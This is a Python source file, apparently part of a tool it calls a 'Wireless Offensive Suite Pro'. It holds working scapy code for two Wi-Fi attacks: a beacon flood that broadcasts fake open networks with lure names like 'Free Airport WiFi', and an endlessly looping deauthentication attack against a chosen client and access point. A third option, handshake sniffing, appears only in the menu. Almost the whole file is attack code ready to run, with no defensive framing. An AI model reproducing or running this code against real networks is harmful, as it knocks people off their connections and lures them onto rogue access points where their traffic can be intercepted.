import time
from scapy.all import Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt, sendp, sniff, wrpcap
from rich.console import Console
from core.ui import draw_header

console = Console()


def beacon_flood(iface):
    """Floods the area with fake 'Free WiFi' networks."""
    ssids = ["Free Airport WiFi", "Starbucks_Guest",
             "Xfinity_Open", "Public_High_Speed"]
    console.print("[bold red][!] Starting Beacon Flood...[/bold red]")

    pkts = []
    for s in ssids:
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                      addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
        beacon = Dot11Beacon(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=s, len=len(s))
        pkts.append(RadioTap()/dot11/beacon/essid)

    try:
        while True:
            for p in pkts:
                sendp(p, iface=iface, verbose=False)
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass


def run_wifi_suite():
    draw_header("Wireless Offensive Suite Pro")
    iface = console.input(
        "[bold yellow]Monitor Mode Interface: [/bold yellow]")

    console.print("\n[1] Deauth Attack  [2] Handshake Sniff  [3] Beacon Flood")
    choice = console.input("\n[wifi]> ")

    if choice == "1":
        target = console.input("Target Client: ")
        bssid = console.input("AP BSSID: ")
        pkt = RadioTap()/Dot11(addr1=target, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        while True:
            sendp(pkt, iface=iface, count=10, inter=0.1)
    elif choice == "3":
        beacon_flood(iface)
